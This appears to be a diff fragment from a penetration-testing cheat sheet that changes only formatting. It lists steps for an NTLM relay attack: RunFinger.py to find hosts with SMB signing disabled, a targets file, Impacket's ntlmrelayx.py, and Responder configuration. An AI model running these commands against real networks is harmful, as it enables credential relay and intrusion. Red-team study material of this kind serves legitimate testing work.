@@ -9,7 +9,7 @@ find /usr/share/responder/ -name "error.log" -print
 ```
 Run python  **RunFinger.py -i IP_Range** to detect machine with SMB signing:disabled.
 ```
-    * Configure Impacket’s NTLMrelayx to target those systems
+Configure Impacket’s NTLMrelayx to target those systems
     * **echo "IP"  >> targets.txt**
     * **ntlmrelayx.py -tf targets.txt --smb2support**
 2. Disable SMB and HTTP response poisoning in Responder and launch
